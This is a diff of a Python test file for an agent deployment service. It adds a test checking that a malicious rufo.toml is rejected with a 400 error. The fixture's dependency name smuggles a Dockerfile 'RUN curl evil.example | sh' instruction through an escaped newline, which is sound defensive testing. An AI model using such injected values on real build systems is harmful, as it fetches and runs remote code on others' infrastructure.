@@ -42,6 +42,15 @@ env:
   - RUFO_TEST_SECRET_NOT_SET_ANYWHERE
 """
 
+_RUFO_TOML_DOCKERFILE_INJECTION = b'''
+[agent]
+name = "demo-agent"
+entrypoint = "agent.py:agent"
+
+[dependencies]
+"x\\"\\nRUN curl evil.example | sh\\n#" = "1.0"
+'''
+
 
 def _make_client(tmp_path):
     store = ControlPlaneStore(tmp_path / "test.db")
@@ -81,6 +90,17 @@ def test_deploy_from_source_succeeds(mock_bucket, mock_upload, mock_build, mock_
     assert deploy_kwargs["env"]["OPENAI_API_KEY"] == "sk-real"
     assert deploy_kwargs["env"]["RUFO_PUBLIC_PATH_PREFIX"] == "/agents/org-1/demo-agent"
     assert store.list_deployments("org_1")
+
+
+def test_deploy_from_source_rejects_dockerfile_injection_attempt(tmp_path):
+    """A malicious dependency name in rufo.toml must 400, not crash as an
+    unhandled 500 -- and must never reach Cloud Build with an injected
+    Dockerfile instruction."""
+    client, _ = _make_client(tmp_path)
+    tar_bytes = _make_tar({"rufo.toml": _RUFO_TOML_DOCKERFILE_INJECTION, "agent.py": b"agent = None\n"})
+    resp = client.post("/deployments/from-source", files={"source": ("agent.tar.gz", tar_bytes, "application/gzip")})
+    assert resp.status_code == 400
+    assert "aren't allowed" in resp.json()["detail"]
 
 
 def test_deploy_from_source_rejects_missing_manifest(tmp_path):
